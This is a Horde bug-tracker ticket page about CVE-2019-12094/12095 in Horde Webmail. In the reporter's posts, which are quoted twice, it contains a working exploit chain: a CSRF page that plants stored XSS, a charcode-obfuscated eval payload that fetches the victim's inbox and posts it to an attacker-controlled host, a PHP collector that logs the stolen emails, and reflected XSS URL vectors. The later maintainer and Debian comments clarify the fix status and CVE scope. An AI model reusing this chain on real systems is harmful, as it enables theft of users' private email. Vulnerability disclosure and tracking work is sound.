<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
<html lang="en-US">
 <head>
      <link href="https://bugs.horde.org/h/static/3acc4964f436805c.css" rel="stylesheet" type="text/css" />  <link type="image/x-icon" href="https://bugs.horde.org/themes/default/graphics/favicon.ico" rel="shortcut icon" />  <link rel="search" type="application/opensearchdescription+xml" href="https://bugs.horde.org/opensearch.php" title="Tickets (https://bugs.horde.org/)" />
<link rel="alternate" type="application/rss+xml" href="https://bugs.horde.org/ticket/14926/rss" title="[#14926] Horde Webmail - XSS + CSRF to SQLi, RCE, Stealing Emails &lt;= v5.2.22" />  <title>Tickets :: [#14926] Horde Webmail - XSS + CSRF to SQLi, RCE, Stealing Emails &lt;= v5.2.22</title>
 </head>

 <body>
<div id="horde-head">
  <div id="horde-logo"><a class="icon" href="/h/services/portal/"></a></div>
  <div id="horde-version">6.0.0-git</div>
  <div id="horde-navigation">
    <div class="horde-navipoint">
      <div class="horde-point-left"></div>
      <ul class="horde-dropdown">
        <li>
          <div class="horde-point-center">
            <a class="horde-mainnavi" href="https://tasks.horde.org/">
              <span class="horde-point-arrow">&#9662;</span>
              Tasks            </a>
          </div>
        <ul>
          <li>
            <div class="horde-drowdown-str"><a class="horde-mainnavi" href="https://tasks.horde.org/task.php?actionID=add_task">New Task</a></div>
          </li>
          <li>
            <div class="horde-drowdown-str"><a class="horde-mainnavi" href="https://tasks.horde.org/search.php">Search</a></div>
          </li>
        </ul>
        </li>
      </ul>
      <div class="horde-point-right"></div>
    </div>
    <div class="horde-navipoint">
      <div class="horde-point-left"></div>
      <ul class="horde-dropdown">
        <li>
          <div class="horde-point-center">
            <a class="horde-mainnavi" href="/h/ansel/">
              Photos            </a>
          </div>
        </li>
      </ul>
      <div class="horde-point-right"></div>
    </div>
    <div class="horde-navipoint">
      <div class="horde-point-left"></div>
      <ul class="horde-dropdown">
        <li>
          <div class="horde-point-center">
            <a class="horde-mainnavi" href="https://wiki.horde.org/">
              Wiki            </a>
          </div>
        </li>
      </ul>
      <div class="horde-point-right"></div>
    </div>
    <div class="horde-navipoint">
      <div class="horde-point-left-active"></div>
      <ul class="horde-dropdown">
        <li>
          <div class="horde-point-center-active">
            <a class="horde-mainnavi-active" href="https://bugs.horde.org/">
              <span class="horde-point-arrow-active">&#9662;</span>
              Tickets            </a>
          </div>
        <ul>
          <li>
            <div class="horde-drowdown-str"><a class="horde-mainnavi" href="https://bugs.horde.org/ticket/create.php">New Ticket</a></div>
          </li>
          <li>
            <div class="horde-drowdown-str"><a class="horde-mainnavi" href="https://bugs.horde.org/search.php">Search</a></div>
          </li>
        </ul>
        </li>
      </ul>
      <div class="horde-point-right-active"></div>
    </div>
    <div class="horde-navipoint">
      <div class="horde-point-left"></div>
      <ul class="horde-dropdown">
        <li>
          <div class="horde-settings horde-icon-settings">
            <a class="horde-mainnavi" href="#">
                          </a>
          </div>
        <ul>
          <li>
            <div class="horde-drowdown-str"><a class="horde-mainnavi" href="javascript:void(HordeCore.Growler.toggleLog());">Toggle Alerts Log</a></div>
          </li>
          <li>
            <div class="horde-drowdown-str"><a class="horde-mainnavi" href="/h/services/help/?module=whups" target="help" onclick="void(HordePopup.popup('%7B%22url%22%3A%22%5C%2Fh%5C%2Fservices%5C%2Fhelp%5C%2F%22%2C%22params%22%3A%7B%22module%22%3A%22whups%22%7D%7D'));return false;">Help</a></div>
          </li>
        </ul>
        </li>
      </ul>
      <div class="horde-point-right"></div>
    </div>
  </div>
  <div id="horde-login"><a class="icon" title="Log in" href="/h/login.php?url=https%3A%2F%2Fbugs.horde.org%2Fticket%2F14926%3Fid%3D14926%26_t%3D1635619421%26_h%3DfEAVY5dBTaZOUC9WFvXDQIEoxXY"></a></div>
  <div id="horde-search">
    <form action="https://bugs.horde.org/ticket" method="get">
      <input type="text" id="horde-search-input" name="searchfield" class="formGhost" title="Ticket #Id" />
      <input type="image" id="horde-search-icon" src="/h/themes/default/graphics/search-topbar.png" />
    </form>
  </div>
</div>
<div id="horde-sub">
  <div id="horde-date">2021-10-30</div>
  <div id="horde-info"></div>
</div>
<div id="horde-body">
<div id="horde-contentwrapper">
<div id="horde-content" style="margin-left:210px">
<div class="tabset"><ul>
<li class="horde-active"><a href="https://bugs.horde.org/ticket/14926">History</a> </li>
<li><a href="https://bugs.horde.org/ticket/14926/attachments">Attachments</a> </li>
<li><a href="https://bugs.horde.org/ticket/14926/comment">Comment</a> </li>
<li><a href="https://bugs.horde.org/ticket/14926/watch">Watch</a> </li>
<li><a href="/h/services/download/?app=whups&amp;actionID=ticket&amp;id=14926&amp;fn=%2Fticket14926.html">Download</a> </li>
</ul></div><br class="clear" />
<div class="horde-form" id="whups_form_ticketdetails_inactive"><div class="header">[#14926] Horde Webmail - XSS + CSRF to SQLi, RCE, Stealing Emails &lt;= v5.2.22</div><div id="whups_form_ticketdetails_section___base" style="display:block;"><table><tr valign="top">
  <td width="15%" align="right"><strong>Summary</strong></td>
  <td>Horde Webmail - XSS + CSRF to SQLi, RCE, Stealing Emails &lt;= v5.2.22</td>
</tr>
<tr valign="top">
  <td width="15%" align="right"><strong>Queue</strong></td>
  <td>Horde Groupware</td>
</tr>
<tr valign="top">
  <td width="15%" align="right"><strong>Queue Version</strong></td>
  <td>5.2.22</td>
</tr>
<tr valign="top">
  <td width="15%" align="right"><strong>Type</strong></td>
  <td>Bug</td>
</tr>
<tr valign="top">
  <td width="15%" align="right"><strong>State</strong></td>
  <td>Resolved</td>
</tr>
<tr valign="top">
  <td width="15%" align="right"><strong>Priority</strong></td>
  <td>3. High</td>
</tr>
<tr valign="top">
  <td width="15%" align="right"><strong>Owners</strong></td>
  <td></td>
</tr>
<tr valign="top">
  <td width="15%" align="right"><strong>Requester</strong></td>
  <td>root (at) numanozdemir (dot) com</td>
</tr>
<tr valign="top">
  <td width="15%" align="right"><strong>Created</strong></td>
  <td>2019-05-17 (897 days ago)</td>
</tr>
<tr valign="top">
  <td width="15%" align="right"><strong>Due</strong></td>
  <td></td>
</tr>
<tr valign="top">
  <td width="15%" align="right"><strong>Updated</strong></td>
  <td>2021-03-30 (214 days ago)</td>
</tr>
<tr valign="top">
  <td width="15%" align="right"><strong>Assigned</strong></td>
  <td></td>
</tr>
<tr valign="top">
  <td width="15%" align="right"><strong>Resolved</strong></td>
  <td>2019-11-18 (712 days ago)</td>
</tr>
<tr valign="top">
  <td width="15%" align="right"><strong>Milestone</strong></td>
  <td></td>
</tr>
<tr valign="top">
  <td width="15%" align="right"><strong>Patch</strong></td>
  <td>No</td>
</tr>
</table></div></div><br class="spacer" /><div class="header">History</div><div id="comments"><div id="t93895">
<table cellspacing="0" width="100%">
 <tr>
  <td width="20%" class="c_l nowrap" valign="top">2021-03-30 03:48:26</td>
  <td width="20%" class="c_m" valign="top">accreditation (at) di (dot) mil (dot) za</td>
  <td width="30%" class="c_m" valign="top"><a href="#c8" id="c8">Comment #8</a></td>
  <td width="30%" class="c_r rightAlign" valign="top"><a href="https://bugs.horde.org/ticket/comment.php?id=14926&amp;transaction=93895">Reply to this comment</a> </td>
 </tr>
 <tr><td colspan="4" class="c_b">
  <div class="comment-body fixed">
   <br /><div class="toggleQuoteParent"><span class="widget toggleQuoteShow">[Show Quoted Text - 87 lines]</span><span class="widget toggleQuoteHide" style="display:none">[Hide Quoted Text]</span><div class="citation quoted1" style="display:none"># Title: Horde Webmail - XSS + CSRF to SQLi, RCE, Stealing Emails &lt;= v5.2.22<br />
# Date: 14.04.2019<br />
# Author: InfinitumIT<br />
# Vendor Homepage: <a href="https://www.horde.org/" target="_blank">https://www.horde.org/</a><br />
# Version: Up to v5.2.22.<br />
# <a href="mailto:info@infinitumit.com.tr">info@infinitumit.com.tr</a> &amp;&amp; infinitumit.com.tr<br />
# PoC: <a href="https://numanozdemir.com/respdisc/horde/horde.mp4" target="_blank">https://numanozdemir.com/respdisc/horde/horde.mp4</a><br />
<br />
# Description:<br />
# Attacker can combine &quot;CSRF vulnerability in Trean Bookmarks&nbsp; <br />
(defaultly installed on Horde Groupware)&quot; and<br />
# &quot;Stored XSS vulnerability in Horde TagCloud (defaultly installed)&quot;&nbsp; <br />
vulnerabilities to steal victim's emails.<br />
<br />
# Also:<br />
# Attacker can use 3 different reflected XSS vulnerability to&nbsp; <br />
exploit Remote Command Execution, SQL Injection and Code Execution.<br />
# To steal e-mails, attacker will send an e-mail to victim and&nbsp; <br />
victim will click the attacker's website. So, victim's inbox will be&nbsp; <br />
dumped in attacker's FTP.<br />
# All of them vulnerabillities are valid for all Horde Webmail versions.<br />
<br />
# Attacker will exploit the CSRF and XSS with: index.html<br />
# Attacker will steal and post the emails with: stealer.js<br />
# Attacker will save the emails with: stealer.php<br />
<br />
# index.html Codes:<br />
&lt;script&gt;<br />
var url = &quot;<a href="http://webmail.victimserver.com/trean/" target="_blank">http://webmail.victimserver.com/trean/</a>&quot;;<br />
var params =&nbsp; <br />
'iframe=0&amp;popup=0&amp;newFolder=&amp;actionID=add_bookmark&amp;url=http%3A%2F%2Ftest.com&amp;title=vulnerability&amp;description=vulnerability&amp;treanBookmarkTags=%22%3E%3Cscript%2Fsrc%3D%22http%3A%2F%2Fyourwebsite.com%2Fhorde%2Fstealer.js%22%3E%3C%2Fscript%3E';<br />
var vuln = new XMLHttpRequest();<br />
vuln.open(&quot;POST&quot;, url, true);<br />
vuln.withCredentials = 'true';<br />
vuln.setRequestHeader(&quot;Content-type&quot;,<br />
&quot;application/x-www-form-urlencoded&quot;);<br />
vuln.send(params);<br />
&lt;/script&gt;<br />
&lt;embed/src=&quot;<a href="http://webmail.victimserver.com/services/portal/&quot;/height=&quot;1&quot;/width=&quot;1" target="_blank">http://webmail.victimserver.com/services/portal/&quot;/height=&quot;1&quot;/width=&quot;1</a>&quot;&gt;<br />
<br />
<br />
# stealer.js Codes:<br />
eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,34,60,115,99,114,105,112,116,32,115,114,99,61,39,104,116,116,112,58,47,47,99,111,100,101,46,106,113,117,101,114,121,46,99,111,109,47,106,113,117,101,114,121,45,51,46,51,46,49,46,109,105,110,46,106,115,39,62,60,47,115,99,114,105,112,116,62,60,115,99,114,105,112,116,62,102,117,110,99,116,105,111,110,32,115,116,101,97,108,40,115,116,97,114,116,44,32,101,110,100,41,123,118,97,114,32,115,116,97,114,116,59,118,97,114,32,101,110,100,59,118,97,114,32,105,59,102,111,114,40,105,61,115,116,97,114,116,59,32,105,60,61,101,110,100,59,32,105,43,43,41,123,36,46,103,101,116,40,39,104,116,116,112,58,47,47,119,101,98,109,97,105,108,46,118,105,99,116,105,109,115,101,114,118,101,114,46,99,111,109,47,105,109,112,47,118,105,101,119,46,112,104,112,63,97,99,116,105,111,110,73,68,61,118,105,101,119,95,115,111,117,114,99,101,38,105,100,61,48,38,109,117,105,100,61,123,53,125,73,78,66,79,88,39,43,105,44,32,102,117,110,99,116,105,<br />
111,110,40,100,97,116,97,41,123,118,97,114,32,120,109,108,72,116,116,112,32,61,32,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,120,109,108,72,116,116,112,46,111,112,101,110,40,39,80,79,83,84,39,44,32,39,104,116,116,112,58,47,47,121,111,117,114,119,101,98,115,105,116,101,46,99,111,109,47,104,111,114,100,101,47,115,116,101,97,108,101,114,46,112,104,112,39,44,32,116,114,117,101,41,59,120,109,108,72,116,116,112,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,39,67,111,110,116,101,110,116,45,84,121,112,101,39,44,32,39,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,39,41,59,120,109,108,72,116,116,112,46,115,101,110,100,40,39,105,110,98,111,120,61,39,43,100,97,116,97,41,59,125,41,59,125,114,101,116,117,114,110,32,105,59,125,115,116,101,97,108,40,56,44,49,53,41,59,60,47,115,99,114,105,112,116,62,34,41,59,10,47,47,32,115,116,101,97,108,40,120,44,121,41,32,61,32,115,1<br />
16,101,97,108,32,102,114,111,109,32,105,100,32,120,32,116,111,32,105,100,32,121))<br />
// It is charcoded, firstly decode and edit for yourself then encode&nbsp; <br />
again. Also dont forget to remove spaces!<br />
<br />
<br />
# stealer.php Codes:<br />
&lt;?php<br />
<br />
<br />
header('Access-Control-Allow-Origin: *');<br />
<br />
header('Access-Control-Allow-Headers: *');<br />
<br />
if($_POST['inbox']){<br />
<br />
$logs = fopen(&quot;inbox.txt&quot;, &quot;a+&quot;);<br />
<br />
$data = $_POST['inbox'].&quot;&nbsp; <br />
-----------------------------------------------------------------&nbsp; <br />
&quot;.chr(13).chr(10).chr(13).chr(10);<br />
fwrite($logs, $data);<br />
<br />
}<br />
<br />
<br />
?&gt;<br />
<br />
#&nbsp; <br />
_____________________________________________________________________________________________________<br />
<br />
# Reflected XSS to Remote Command Execution, Remote Code Execution&nbsp; <br />
and SQL Injection<br />
<br />
<br />
<a href="http://webmail.victimserver.com/groupware/admin/user.php?user_name=XSS-PAYLOAD-HERE&amp;form=update_f" target="_blank">http://webmail.victimserver.com/groupware/admin/user.php?user_name=XSS-PAYLOAD-HERE&amp;form=update_f</a><br />
<a href="http://webmailvictimserver.com/groupware/admin/user.php?user_name=XSS-PAYLOAD-HERE&amp;form=remove_f" target="_blank">http://webmailvictimserver.com/groupware/admin/user.php?user_name=XSS-PAYLOAD-HERE&amp;form=remove_f</a><br />
<a href="http://webmail.victimserver.com/groupware/admin/config/diff.php?app=XSS-PAYLOAD-HERE" target="_blank">http://webmail.victimserver.com/groupware/admin/config/diff.php?app=XSS-PAYLOAD-HERE</a><br />
<br />
# Attacker can execute commands &amp; PHP codes remotely and inject&nbsp; <br />
harmful SQL queries. Also, attacker can create users too with those&nbsp; <br />
reflected XSS vulnerabilities.<br />
<br />
# Stay Secure with InfinitumIT - infinitumit.com.tr<br /></div></div>  </div>
 </td></tr>
</table>
</div>
<div id="t93567">
<table cellspacing="0" width="100%">
 <tr>
  <td width="20%" class="c_l nowrap" valign="top">2019-12-04 15:10:37</td>
  <td width="20%" class="c_m" valign="top">roberto (at) debian (dot) org</td>
  <td width="30%" class="c_m" valign="top"><a href="#c7" id="c7">Comment #7</a></td>
  <td width="30%" class="c_r rightAlign" valign="top"><a href="https://bugs.horde.org/ticket/comment.php?id=14926&amp;transaction=93567">Reply to this comment</a> </td>
 </tr>
 <tr><td colspan="4" class="c_b">
  <div class="comment-body fixed">
   Thanks for the follow-up.&nbsp; I also asked MITRE and they offered the&nbsp; <br />
following clarification:<br /><div class="citation quoted1">The stored XSS should be considered part of the CSRF vulnerability&nbsp; <br />
in CVE-2019-12095, with the CSRF being the primary vulnerability.&nbsp; <br />
The reflected XSS vectors are all covered by CVE-2019-12094.<br /></div>The CVE database entries have been updated as to be more clear.<br />
  </div>
 </td></tr>
</table>
</div>
<div id="t93565">
<table cellspacing="0" width="100%">
 <tr>
  <td width="20%" class="c_l nowrap" valign="top">2019-12-04 00:44:21</td>
  <td width="20%" class="c_m" valign="top">Michael Rubinsky</td>
  <td width="30%" class="c_m" valign="top"><a href="#c6" id="c6">Comment #6</a></td>
  <td width="30%" class="c_r rightAlign" valign="top"><a href="https://bugs.horde.org/ticket/comment.php?id=14926&amp;transaction=93565">Reply to this comment</a> </td>
 </tr>
 <tr><td colspan="4" class="c_b">
  <div class="comment-body fixed">
   As far as I know those are the only two issues applicable to this&nbsp; <br />
ticket. I think the third was the &quot;exploit&quot; of being able to obtain&nbsp; <br />
IMAP messages via GET requests, from a webmail application...<br />
  </div>
 </td></tr>
</table>
</div>
<div id="t93564">
<table cellspacing="0" width="100%">
 <tr>
  <td width="20%" class="c_l nowrap" valign="top">2019-12-03 02:57:18</td>
  <td width="20%" class="c_m" valign="top">roberto (at) debian (dot) org</td>
  <td width="30%" class="c_m" valign="top"><a href="#c5" id="c5">Comment #5</a></td>
  <td width="30%" class="c_r rightAlign" valign="top"><a href="https://bugs.horde.org/ticket/comment.php?id=14926&amp;transaction=93564">Reply to this comment</a> </td>
 </tr>
 <tr><td colspan="4" class="c_b">
  <div class="comment-body fixed">
   The original report included the following:<br /><div class="citation quoted1"># Attacker can combine &quot;CSRF vulnerability in Trean Bookmarks&nbsp; <br />
(defaultly installed on Horde Groupware)&quot; and<br />
# &quot;Stored XSS vulnerability in Horde TagCloud (defaultly installed)&quot;&nbsp; <br />
vulnerabilities to steal victim's emails.<br />
<br />
# Also:<br />
# Attacker can use 3 different reflected XSS vulnerability to&nbsp; <br />
exploit Remote Command Execution, SQL Injection and Code Execution.<br /></div>I am working on updating the Horde packages in Debian LTS, also&nbsp; <br />
coordinating with the security team for an update to Debian stable,&nbsp; <br />
and so some clarification would help.<br />
<br />
It is clear that the TagCloud XSS (CVE-2019-12094) was fixed and the&nbsp; <br />
associated commit was easy to find and applied cleanly to the Horde&nbsp; <br />
package in Debian.&nbsp; It is also clear that the CSRF (CVE-2019-12095)&nbsp; <br />
has been deemed minor and not worth fixing.&nbsp; However, it is not clear&nbsp; <br />
that the &quot;3 different reflected XSS vulnerability&quot; have been&nbsp; <br />
addressed.&nbsp; Is there an additional vulnerability there beyond those&nbsp; <br />
two which received CVE assignments?&nbsp; Answering this would help ensure&nbsp; <br />
that we properly track the state of Horde in Debian.<br />
  </div>
 </td></tr>
</table>
</div>
<div id="t93551">
<table cellspacing="0" width="100%">
 <tr>
  <td width="20%" class="c_l nowrap" valign="top">2019-11-18 20:25:44</td>
  <td width="20%" class="c_m" valign="top">Jan Schneider</td>
  <td width="30%" class="c_m" valign="top"><a href="#c4" id="c4">Comment #4</a><br />State &rArr; Resolved</td>
  <td width="30%" class="c_r rightAlign" valign="top"><a href="https://bugs.horde.org/ticket/comment.php?id=14926&amp;transaction=93551">Reply to this comment</a> </td>
 </tr>
 <tr><td colspan="4" class="c_b">
  <div class="comment-body fixed">
   For the record:<br />
* The XSS in the Horde tag cloud widget had already been discovered,&nbsp; <br />
fixed, and released by ourselves with Horde 5.2.21 on April 21, before&nbsp; <br />
the report: <a href="https://lists.horde.org/archives/announce/2019/001278.html" target="_blank">https://lists.horde.org/archives/announce/2019/001278.html</a>&nbsp; <br />
Without this, the whole &quot;attack&quot; is not exploitable.<br />
* Adding bookmarks in Trean is indeed not CSRF protected, but that's&nbsp; <br />
low priority for us, because it's a non-destructive action.<br />
* GETting IMAP messages from IMP is a core functionality of the&nbsp; <br />
webmail client and is hardly to be called a vulnerability. Whether it&nbsp; <br />
would make sense to token-protected such requests is at least debatable.<br />
* The reporter irresponsibly disclosed his findings, because we were&nbsp; <br />
not willing, nor able to pay him a bounty price upfront.<br />
<br />
Also for the records, these finding have been assigned CVE 2019-12094&nbsp; <br />
&amp; CVE-2019-12095.<br />
<br />
Conclusion: no Horde installation installed or updated since April&nbsp; <br />
21st 2019 is vulnerable to this exploit.<br />
<br />
  </div>
 </td></tr>
</table>
</div>
<div id="t93384">
<table cellspacing="0" width="100%">
 <tr>
  <td width="20%" class="c_l nowrap" valign="top">2019-05-17 20:47:23</td>
  <td width="20%" class="c_m" valign="top">root (at) numanozdemir (dot) com</td>
  <td width="30%" class="c_m" valign="top"><a href="#c3" id="c3">Comment #3</a></td>
  <td width="30%" class="c_r rightAlign" valign="top"><a href="https://bugs.horde.org/ticket/comment.php?id=14926&amp;transaction=93384">Reply to this comment</a> </td>
 </tr>
 <tr><td colspan="4" class="c_b">
  <div class="comment-body fixed">
   Download materials: <a href="https://numanozdemir.com/respdisc/horde/materials.zip" target="_blank">https://numanozdemir.com/respdisc/horde/materials.zip</a><br />
  </div>
 </td></tr>
</table>
</div>
<div id="t93383">
<table cellspacing="0" width="100%">
 <tr>
  <td width="20%" class="c_l nowrap" valign="top">2019-05-17 19:59:17</td>
  <td width="20%" class="c_m" valign="top">root (at) numanozdemir (dot) com</td>
  <td width="30%" class="c_m" valign="top"><a href="#c2" id="c2">Comment #2</a></td>
  <td width="30%" class="c_r rightAlign" valign="top"><a href="https://bugs.horde.org/ticket/comment.php?id=14926&amp;transaction=93383">Reply to this comment</a> </td>
 </tr>
 <tr><td colspan="4" class="c_b">
  <div class="comment-body fixed">
   And, CVE numbers: CVE-2019-12094 and CVE-2019-12095.<br />
  </div>
 </td></tr>
</table>
</div>
<div id="t93382">
<table cellspacing="0" width="100%">
 <tr>
  <td width="20%" class="c_l nowrap" valign="top">2019-05-17 19:57:53</td>
  <td width="20%" class="c_m" valign="top">root (at) numanozdemir (dot) com</td>
  <td width="30%" class="c_m" valign="top"><a href="#c1" id="c1">Comment #1</a><br />Type &rArr; Bug<br />State &rArr; Unconfirmed<br />Priority &rArr; 3. High<br />Summary &rArr; Horde Webmail - XSS + CSRF to SQLi, RCE, Stealing Emails &lt;= v5.2.22<br />Due &rArr; 2019-05-20<br />Queue &rArr; Horde Groupware<br />Milestone &rArr; <br />Patch &rArr; No</td>
  <td width="30%" class="c_r rightAlign" valign="top"><a href="https://bugs.horde.org/ticket/comment.php?id=14926&amp;transaction=93382">Reply to this comment</a> </td>
 </tr>
 <tr><td colspan="4" class="c_b">
  <div class="comment-body fixed">
   # Title: Horde Webmail - XSS + CSRF to SQLi, RCE, Stealing Emails &lt;= v5.2.22<br />
# Date: 14.04.2019<br />
# Author: InfinitumIT<br />
# Vendor Homepage: <a href="https://www.horde.org/" target="_blank">https://www.horde.org/</a><br />
# Version: Up to v5.2.22.<br />
# <a href="mailto:info@infinitumit.com.tr">info@infinitumit.com.tr</a> &amp;&amp; infinitumit.com.tr<br />
# PoC: <a href="https://numanozdemir.com/respdisc/horde/horde.mp4" target="_blank">https://numanozdemir.com/respdisc/horde/horde.mp4</a><br />
<br />
# Description:<br />
# Attacker can combine &quot;CSRF vulnerability in Trean Bookmarks&nbsp; <br />
(defaultly installed on Horde Groupware)&quot; and<br />
# &quot;Stored XSS vulnerability in Horde TagCloud (defaultly installed)&quot;&nbsp; <br />
vulnerabilities to steal victim's emails.<br />
<br />
# Also:<br />
# Attacker can use 3 different reflected XSS vulnerability to exploit&nbsp; <br />
Remote Command Execution, SQL Injection and Code Execution.<br />
# To steal e-mails, attacker will send an e-mail to victim and victim&nbsp; <br />
will click the attacker's website. So, victim's inbox will be dumped&nbsp; <br />
in attacker's FTP.<br />
# All of them vulnerabillities are valid for all Horde Webmail versions.<br />
<br />
# Attacker will exploit the CSRF and XSS with: index.html<br />
# Attacker will steal and post the emails with: stealer.js<br />
# Attacker will save the emails with: stealer.php<br />
<br />
# index.html Codes:<br />
&lt;script&gt;<br />
var url = &quot;<a href="http://webmail.victimserver.com/trean/" target="_blank">http://webmail.victimserver.com/trean/</a>&quot;;<br />
var params =&nbsp; <br />
'iframe=0&amp;popup=0&amp;newFolder=&amp;actionID=add_bookmark&amp;url=http%3A%2F%2Ftest.com&amp;title=vulnerability&amp;description=vulnerability&amp;treanBookmarkTags=%22%3E%3Cscript%2Fsrc%3D%22http%3A%2F%2Fyourwebsite.com%2Fhorde%2Fstealer.js%22%3E%3C%2Fscript%3E';<br />
var vuln = new XMLHttpRequest();<br />
vuln.open(&quot;POST&quot;, url, true);<br />
vuln.withCredentials = 'true';<br />
vuln.setRequestHeader(&quot;Content-type&quot;,<br />
&quot;application/x-www-form-urlencoded&quot;);<br />
vuln.send(params);<br />
&lt;/script&gt;<br />
&lt;embed/src=&quot;<a href="http://webmail.victimserver.com/services/portal/&quot;/height=&quot;1&quot;/width=&quot;1" target="_blank">http://webmail.victimserver.com/services/portal/&quot;/height=&quot;1&quot;/width=&quot;1</a>&quot;&gt;<br />
<br />
<br />
# stealer.js Codes:<br />
eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,34,60,115,99,114,105,112,116,32,115,114,99,61,39,104,116,116,112,58,47,47,99,111,100,101,46,106,113,117,101,114,121,46,99,111,109,47,106,113,117,101,114,121,45,51,46,51,46,49,46,109,105,110,46,106,115,39,62,60,47,115,99,114,105,112,116,62,60,115,99,114,105,112,116,62,102,117,110,99,116,105,111,110,32,115,116,101,97,108,40,115,116,97,114,116,44,32,101,110,100,41,123,118,97,114,32,115,116,97,114,116,59,118,97,114,32,101,110,100,59,118,97,114,32,105,59,102,111,114,40,105,61,115,116,97,114,116,59,32,105,60,61,101,110,100,59,32,105,43,43,41,123,36,46,103,101,116,40,39,104,116,116,112,58,47,47,119,101,98,109,97,105,108,46,118,105,99,116,105,109,115,101,114,118,101,114,46,99,111,109,47,105,109,112,47,118,105,101,119,46,112,104,112,63,97,99,116,105,111,110,73,68,61,118,105,101,119,95,115,111,117,114,99,101,38,105,100,61,48,38,109,117,105,100,61,123,53,125,73,78,66,79,88,39,43,105,44,32,102,117,110,99,116,105,11<br />
1,110,40,100,97,116,97,41,123,118,97,114,32,120,109,108,72,116,116,112,32,61,32,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,120,109,108,72,116,116,112,46,111,112,101,110,40,39,80,79,83,84,39,44,32,39,104,116,116,112,58,47,47,121,111,117,114,119,101,98,115,105,116,101,46,99,111,109,47,104,111,114,100,101,47,115,116,101,97,108,101,114,46,112,104,112,39,44,32,116,114,117,101,41,59,120,109,108,72,116,116,112,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,39,67,111,110,116,101,110,116,45,84,121,112,101,39,44,32,39,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,39,41,59,120,109,108,72,116,116,112,46,115,101,110,100,40,39,105,110,98,111,120,61,39,43,100,97,116,97,41,59,125,41,59,125,114,101,116,117,114,110,32,105,59,125,115,116,101,97,108,40,56,44,49,53,41,59,60,47,115,99,114,105,112,116,62,34,41,59,10,47,47,32,115,116,101,97,108,40,120,44,121,41,32,61,32,115,116,1<br />
01,97,108,32,102,114,111,109,32,105,100,32,120,32,116,111,32,105,100,32,121))<br />
// It is charcoded, firstly decode and edit for yourself then encode&nbsp; <br />
again. Also dont forget to remove spaces!<br />
<br />
<br />
# stealer.php Codes:<br />
&lt;?php<br />
<br />
<br />
header('Access-Control-Allow-Origin: *');<br />
<br />
header('Access-Control-Allow-Headers: *');<br />
<br />
if($_POST['inbox']){<br />
<br />
$logs = fopen(&quot;inbox.txt&quot;, &quot;a+&quot;);<br />
<br />
$data = $_POST['inbox'].&quot;&nbsp; <br />
-----------------------------------------------------------------&nbsp; <br />
&quot;.chr(13).chr(10).chr(13).chr(10);<br />
fwrite($logs, $data);<br />
<br />
}<br />
<br />
<br />
?&gt;<br />
<br />
#&nbsp; <br />
_____________________________________________________________________________________________________<br />
<br />
# Reflected XSS to Remote Command Execution, Remote Code Execution and&nbsp; <br />
SQL Injection<br />
<br />
<br />
<a href="http://webmail.victimserver.com/groupware/admin/user.php?user_name=XSS-PAYLOAD-HERE&amp;form=update_f" target="_blank">http://webmail.victimserver.com/groupware/admin/user.php?user_name=XSS-PAYLOAD-HERE&amp;form=update_f</a><br />
<a href="http://webmailvictimserver.com/groupware/admin/user.php?user_name=XSS-PAYLOAD-HERE&amp;form=remove_f" target="_blank">http://webmailvictimserver.com/groupware/admin/user.php?user_name=XSS-PAYLOAD-HERE&amp;form=remove_f</a><br />
<a href="http://webmail.victimserver.com/groupware/admin/config/diff.php?app=XSS-PAYLOAD-HERE" target="_blank">http://webmail.victimserver.com/groupware/admin/config/diff.php?app=XSS-PAYLOAD-HERE</a><br />
<br />
# Attacker can execute commands &amp; PHP codes remotely and inject&nbsp; <br />
harmful SQL queries. Also, attacker can create users too with those&nbsp; <br />
reflected XSS vulnerabilities.<br />
<br />
# Stay Secure with InfinitumIT - infinitumit.com.tr<br />
  </div>
 </td></tr>
</table>
</div>
</div></div>
</div>

<div id="horde-sidebar" style="width:210px">

  <div class="horde-new">
    <span class="horde-new-link"><a href="https://bugs.horde.org/ticket/create.php">New Ticket</a></span>
  </div>



<div>
<div class="horde-subnavi">
 <div class="horde-subnavi-icon whups-mywhups">
  <a class="icon"></a>
 </div><div class="horde-subnavi-point"><a href="https://bugs.horde.org/mybugs.php">My Tickets</a> </div>
</div>
<div class="horde-subnavi">
 <div class="horde-subnavi-icon horde-search">
  <a class="icon"></a>
 </div><div class="horde-subnavi-point"><a href="https://bugs.horde.org/search.php">Search</a> </div>
</div>
<div class="horde-subnavi">
 <div class="horde-subnavi-icon whups-query">
  <a class="icon"></a>
 </div><div class="horde-subnavi-point"><a href="https://bugs.horde.org/query/index.php">Query Builder</a> </div>
</div>
<div class="horde-subnavi">
 <div class="horde-subnavi-icon whups-reports">
  <a class="icon"></a>
 </div><div class="horde-subnavi-point"><a href="https://bugs.horde.org/reports.php">Reports</a> </div>
</div>
</div>
<div class="horde-sidebar-split"></div>

<h3>
  <span id="whups-toggle-queries" class="horde-collapse" title="Collapse">Saved Queries</span>
</h3>

<div>
<div class="horde-subnavi">
 <div class="horde-subnavi-icon whups-sidebar-query">
  <a class="icon"></a>
 </div><div class="horde-subnavi-point"><a href="https://bugs.horde.org/query/bugs">Open Bugs</a> </div>
</div>
<div class="horde-subnavi">
 <div class="horde-subnavi-icon whups-sidebar-query">
  <a class="icon"></a>
 </div><div class="horde-subnavi-point"><a href="https://bugs.horde.org/query/feedback">Bugs waiting for Feedback</a> </div>
</div>
<div class="horde-subnavi">
 <div class="horde-subnavi-icon whups-sidebar-query">
  <a class="icon"></a>
 </div><div class="horde-subnavi-point"><a href="https://bugs.horde.org/query/releases">Open Bugs in Releases</a> </div>
</div>
<div class="horde-subnavi">
 <div class="horde-subnavi-icon whups-sidebar-query">
  <a class="icon"></a>
 </div><div class="horde-subnavi-point"><a href="https://bugs.horde.org/query/enhancements">Open Enhancements</a> </div>
</div>
